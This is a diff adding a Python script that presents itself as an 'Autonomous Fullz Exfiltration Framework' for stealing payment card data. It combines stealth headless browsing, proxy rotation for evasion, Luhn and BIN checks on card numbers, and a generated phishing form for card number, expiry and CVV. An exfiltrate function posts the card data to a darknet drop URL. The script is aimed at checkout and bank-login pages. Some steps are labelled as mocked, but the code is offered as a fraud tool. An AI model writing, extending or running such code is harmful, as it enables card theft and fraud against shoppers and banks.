@@ -1,0 +1,105 @@
+#!/usr/bin/env python3
+"""
+ZeroTrace Engine: Autonomous Fullz Exfiltration Framework
+Combines:
+✔️ Web Scraping (BeautifulSoup, Scrapy, Selenium)
+✔️ AI-Driven Social Engineering
+✔️ BIN & Luhn Card Validation
+✔️ Client-Side Payload Injection
+✔️ Proxy Rotation + Evasion
+✔️ Real-time Exfiltration + Underground API Hooks
+"""
+
+import requests, re, time, threading, logging, sqlite3, random
+from bs4 import BeautifulSoup
+from scrapy import Selector
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
+from fake_useragent import UserAgent
+from uuid import uuid4
+from concurrent.futures import ThreadPoolExecutor
+
+# --- Logging Setup ---
+logging.basicConfig(level=logging.INFO, format="%(asctime)s [ZeroTrace] %(message)s")
+
+# --- Proxy/Evasion Tools ---
+proxies = ["http://192.168.1.1:8080", "http://192.168.1.2:8080"]
+def rotate_proxy():
+    return random.choice(proxies)
+
+# --- Browser Setup (Stealth) ---
+def get_browser():
+    ua = UserAgent().random
+    options = Options()
+    options.add_argument(f'user-agent={ua}')
+    options.add_argument('--headless')
+    options.add_argument('--disable-blink-features=AutomationControlled')
+    driver = webdriver.Chrome(options=options)
+    return driver
+
+# --- Luhn Validation ---
+def luhn_check(card_number):
+    digits = [int(x) for x in str(card_number)][::-1]
+    checksum = sum(d if i % 2 == 0 else sum(divmod(2 * d, 10)) for i, d in enumerate(digits))
+    return checksum % 10 == 0
+
+# --- BIN Validation ---
+def bin_lookup(bin_number):
+    try:
+        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
+        return response.json()
+    except:
+        return {}
+
+# --- Phishing Page Generator (Mocked) ---
+def generate_phishing_page():
+    html = """
+    <html><body>
+    <form id='stealth'>
+    <input name='card' placeholder='Card Number'>
+    <input name='exp' placeholder='MM/YY'>
+    <input name='cvv' placeholder='CVV'>
+    </form>
+    </body></html>
+    """
+    return html
+
+# --- Data Exfiltration ---
+def exfiltrate(data):
+    logging.info(f"Exfiltrating: {data}")
+    # Simulate sending to underground drop server
+    try:
+        requests.post("http://darknet.onion/api/upload", json=data, timeout=5)
+    except:
+        pass
+
+# --- Main Scraping and Injection ---
+def scan_site(url):
+    proxy = rotate_proxy()
+    try:
+        headers = {"User-Agent": UserAgent().random}
+        r = requests.get(url, headers=headers, proxies={"http": proxy, "https": proxy}, timeout=10)
+        soup = BeautifulSoup(r.text, 'html.parser')
+        forms = soup.find_all('form')
+        for form in forms:
+            logging.info(f"Injecting into: {url}")
+            # Injection payload (mocked)
+            payload = generate_phishing_page()
+            card = "4111111111111111"
+            if luhn_check(card):
+                bin_info = bin_lookup(card[:6])
+                if bin_info.get("type") == "credit":
+                    exfiltrate({"card": card, "site": url, "bin": bin_info})
+    except Exception as e:
+        logging.warning(f"Failed to scan {url}: {e}")
+
+# --- Launcher ---
+if __name__ == "__main__":
+    targets = [
+        "https://vulnerable-shop1.com/checkout",
+        "https://sketchy-form.net/pay",
+        "https://clone-bank-login.biz/"
+    ]
+    with ThreadPoolExecutor(max_workers=5) as executor:
+        executor.map(scan_site, targets)
